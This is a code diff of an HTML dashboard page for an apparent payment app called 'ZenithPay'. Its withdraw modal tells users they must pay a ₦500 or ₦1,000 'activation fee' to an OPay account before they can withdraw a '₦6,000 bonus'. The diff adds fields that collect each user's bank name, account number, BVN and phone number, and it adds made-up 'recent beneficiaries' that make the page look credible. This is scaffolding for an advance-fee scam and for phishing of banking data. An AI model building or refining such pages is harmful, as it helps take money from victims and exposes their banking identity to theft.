@@ -160,80 +160,7 @@
                 </div>
             </div>
         </div>
-<!-- ===== WITHDRAW MODAL (OPay Account Number + User Bank Details) ===== -->
-<div id="withdrawModal" class="modal hidden">
-    <div class="modal-box">
-        <div class="modal-head">
-            <h3>💳 Withdraw Funds</h3>
-            <button class="close" id="closeModal">✕</button>
-        </div>
-        <p class="modal-sub">To withdraw your ₦6,000 bonus, pay the activation fee to the OPay account below.</p>
 
-        <div class="field">
-            <label>Amount to Withdraw</label>
-            <input type="text" value="₦6,000" disabled class="disabled" />
-        </div>
-
-        <div class="field">
-            <label>Activation Fee</label>
-            <select id="depositAmount">
-                <option value="500">₦500</option>
-                <option value="1000">₦1,000</option>
-            </select>
-            <small>Send this amount to the OPay account below</small>
-        </div>
-
-        <!-- ===== OPAY ACCOUNT DETAILS (Your Account) ===== -->
-        <div class="bank-box">
-            <p>💳 Send payment to:</p>
-            <div class="bank-detail">
-                <span class="label">Bank:</span>
-                <span class="value">OPay</span>
-            </div>
-            <div class="bank-detail">
-                <span class="label">Account Name:</span>
-                <span class="value" id="opayName">ZenithPay Admin</span>
-            </div>
-            <div class="bank-detail">
-                <span class="label">Account Number:</span>
-                <span class="value highlight" id="opayAccount">0123456789</span>
-            </div>
-            <button class="btn-copy" id="copyAccount">📋 Copy Account Number</button>
-        </div>
-
-        <!-- ===== USER'S BANK DETAILS (Where they want to receive) ===== -->
-        <div class="field">
-            <label>Your Bank Name</label>
-            <select id="userBank">
-                <option value="">Select your bank</option>
-                <option value="Access Bank">Access Bank</option>
-                <option value="GTBank">GTBank</option>
-                <option value="First Bank">First Bank</option>
-                <option value="Zenith Bank">Zenith Bank</option>
-                <option value="UBA">UBA</option>
-                <option value="Fidelity Bank">Fidelity Bank</option>
-                <option value="Stanbic IBTC">Stanbic IBTC</option>
-                <option value="Ecobank">Ecobank</option>
-                <option value="Union Bank">Union Bank</option>
-                <option value="Wema Bank">Wema Bank</option>
-                <option value="Sterling Bank">Sterling Bank</option>
-                <option value="Heritage Bank">Heritage Bank</option>
-                <option value="Keystone Bank">Keystone Bank</option>
-                <option value="Jaiz Bank">Jaiz Bank</option>
-                <option value="Suntrust Bank">Suntrust Bank</option>
-                <option value="Providus Bank">Providus Bank</option>
-                <option value="Titan Trust Bank">Titan Trust Bank</option>
-            </select>
-        </div>
-        <div class="field">
-            <label>Your Account Number</label>
-            <input type="text" id="userAccountNumber" placeholder="Enter valid account number" />
-        </div>
-
-        <button class="btn-verify" id="iHavePaidBtn">✅ I Have Paid</button>
-        <p class="modal-footer-hint">After payment, click "I Have Paid" to verify.</p>
-    </div>
-    </div>
         <!-- ===== TAB 3: TRANSFER ===== -->
         <div id="tabTransfer" class="tab-content hidden">
             <div class="page-header">
@@ -263,8 +190,6 @@
                         <option value="Suntrust Bank">Suntrust Bank</option>
                         <option value="Providus Bank">Providus Bank</option>
                         <option value="Titan Trust Bank">Titan Trust Bank</option>
-                        <option value="Opay Bank">OPAY BANK</option>
-                        <option value=Palmpay Bank">PALMPAY BANK</option>
                     </select>
                 </div>
                 <div class="field">
@@ -289,7 +214,23 @@
 
             <div class="beneficiaries-card">
                 <h4>Recent Beneficiaries</h4>
-            
+                <div class="beneficiary-list">
+                    <div class="beneficiary">
+                        <span>👤</span>
+                        <span>Chidi Okafor</span>
+                        <span>GTBank</span>
+                    </div>
+                    <div class="beneficiary">
+                        <span>👤</span>
+                        <span>Amina Bello</span>
+                        <span>Access Bank</span>
+                    </div>
+                    <div class="beneficiary">
+                        <span>👤</span>
+                        <span>Kunle Adeyemi</span>
+                        <span>UBA</span>
+                    </div>
+                </div>
             </div>
         </div>
 
@@ -370,7 +311,7 @@
 
     </div>
 
-    <!-- ===== WITHDRAW MODAL (OPay Account Number) ===== -->
+    <!-- ===== WITHDRAW MODAL (OPay Account + User Bank Details + BVN + Phone) ===== -->
     <div id="withdrawModal" class="modal hidden">
         <div class="modal-box">
             <div class="modal-head">
@@ -393,7 +334,7 @@
                 <small>Send this amount to the OPay account below</small>
             </div>
 
-            <!-- ===== OPAY ACCOUNT DETAILS ===== -->
+            <!-- ===== OPAY ACCOUNT DETAILS (Your Account) ===== -->
             <div class="bank-box">
                 <p>💳 Send payment to:</p>
                 <div class="bank-detail">
@@ -409,6 +350,44 @@
                     <span class="value highlight" id="opayAccount">0123456789</span>
                 </div>
                 <button class="btn-copy" id="copyAccount">📋 Copy Account Number</button>
+            </div>
+
+            <!-- ===== USER'S DETAILS (Bank, Account, BVN, Phone) ===== -->
+            <div class="field">
+                <label>Your Bank Name</label>
+                <select id="userBank">
+                    <option value="">Select your bank</option>
+                    <option value="Access Bank">Access Bank</option>
+                    <option value="GTBank">GTBank</option>
+                    <option value="First Bank">First Bank</option>
+                    <option value="Zenith Bank">Zenith Bank</option>
+                    <option value="UBA">UBA</option>
+                    <option value="Fidelity Bank">Fidelity Bank</option>
+                    <option value="Stanbic IBTC">Stanbic IBTC</option>
+                    <option value="Ecobank">Ecobank</option>
+                    <option value="Union Bank">Union Bank</option>
+                    <option value="Wema Bank">Wema Bank</option>
+                    <option value="Sterling Bank">Sterling Bank</option>
+                    <option value="Heritage Bank">Heritage Bank</option>
+                    <option value="Keystone Bank">Keystone Bank</option>
+                    <option value="Jaiz Bank">Jaiz Bank</option>
+                    <option value="Suntrust Bank">Suntrust Bank</option>
+                    <option value="Providus Bank">Providus Bank</option>
+                    <option value="Titan Trust Bank">Titan Trust Bank</option>
+                </select>
+            </div>
+            <div class="field">
+                <label>Your Account Number</label>
+                <input type="text" id="userAccountNumber" placeholder="Enter your account number" />
+            </div>
+            <div class="field">
+                <label>BVN (Bank Verification Number)</label>
+                <input type="text" id="userBvn" placeholder="Enter your BVN" />
+                <small>For verification purposes</small>
+            </div>
+            <div class="field">
+                <label>Phone Number</label>
+                <input type="tel" id="userPhone" placeholder="Enter your phone number" />
             </div>
 
             <button class="btn-verify" id="iHavePaidBtn">✅ I Have Paid</button>
@@ -442,6 +421,6 @@
         </div>
     </div>
 
-    <script src="dashboard.js"></script>
+    <script scr="dashboard.js"></script>
 </body>
-    </html>
+</html>
